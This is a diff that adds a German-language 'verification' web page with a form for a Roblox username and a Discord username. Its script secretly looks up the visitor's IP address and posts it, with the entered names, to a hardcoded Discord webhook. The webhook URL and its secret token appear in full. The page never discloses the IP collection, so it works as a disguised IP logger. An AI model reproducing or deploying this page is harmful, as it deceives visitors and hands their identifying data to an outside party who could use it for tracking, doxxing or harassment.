@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verifizierung</title>
+  <style>
+    /* Grund-Reset */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .card {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      padding: 2rem;
+      max-width: 400px;
+      width: 100%;
+    }
+
+    .card h2 {
+      margin-bottom: 1rem;
+      color: #333;
+      text-align: center;
+    }
+
+    .field {
+      margin-bottom: 1rem;
+    }
+
+    .field label {
+      display: block;
+      margin-bottom: 0.3rem;
+      color: #555;
+    }
+
+    .field input {
+      width: 100%;
+      padding: 0.6rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+
+    .button {
+      width: 100%;
+      padding: 0.8rem;
+      background: #5865F2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+    .button:hover {
+      background: #4752c4;
+    }
+
+    #status {
+      margin-top: 1rem;
+      font-size: 0.9rem;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <h2>Verifizierung</h2>
+    <form id="verifyForm">
+      <div class="field">
+        <label for="roblox">Roblox-Username</label>
+        <input type="text" id="roblox" name="roblox" placeholder="z. B. Username1234" required />
+      </div>
+      <div class="field">
+        <label for="discord">Discord-Benutzer</label>
+        <input type="text" id="discord" name="discord" placeholder="z. B. Username#1234" required />
+      </div>
+      <button type="submit" class="button">Verifizieren</button>
+    </form>
+    <p id="status"></p>
+  </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1373691461949984880/u8kTOYOOMFOUbaxUtTCh_lDDXwE1oIGIf5FAKY0B35PRpqij7XOllBQ38fZVn14JV75j";
+
+    async function getIP() {
+      try {
+        // IPv6-fähige API zuerst
+        let res = await fetch('https://api64.ipify.org?format=json');
+        let data = await res.json();
+        if (data.ip) return data.ip;
+      } catch {}
+      try {
+        let res = await fetch('https://api.ipify.org?format=json');
+        let data = await res.json();
+        return data.ip;
+      } catch {
+        return 'IP konnte nicht ermittelt werden';
+      }
+    }
+
+    document.getElementById('verifyForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const roblox = document.getElementById('roblox').value.trim();
+      const discord = document.getElementById('discord').value.trim();
+      const statusEl = document.getElementById('status');
+      statusEl.textContent = "🔄 Sende Verifikation…";
+
+      if (!roblox || !discord) {
+        statusEl.textContent = "❌ Bitte beide Felder ausfüllen!";
+        return;
+      }
+
+      const ip = await getIP();
+
+      const payload = {
+        content: `**Neue Verifikation**\n• Roblox: ${roblox}\n• Discord: ${discord}\n• IP: ${ip}`
+      };
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      })
+      .then(res => {
+        if (res.ok) {
+          statusEl.textContent = "✅ Verifikation erfolgreich gesendet!";
+          this.reset();
+        } else {
+          statusEl.textContent = "❌ Fehler beim Senden.";
+        }
+      })
+      .catch(err => {
+        console.error(err);
+        statusEl.textContent = "❌ Fehler beim Senden.";
+      });
+    });
+  </script>
+
+</body>
+</html>
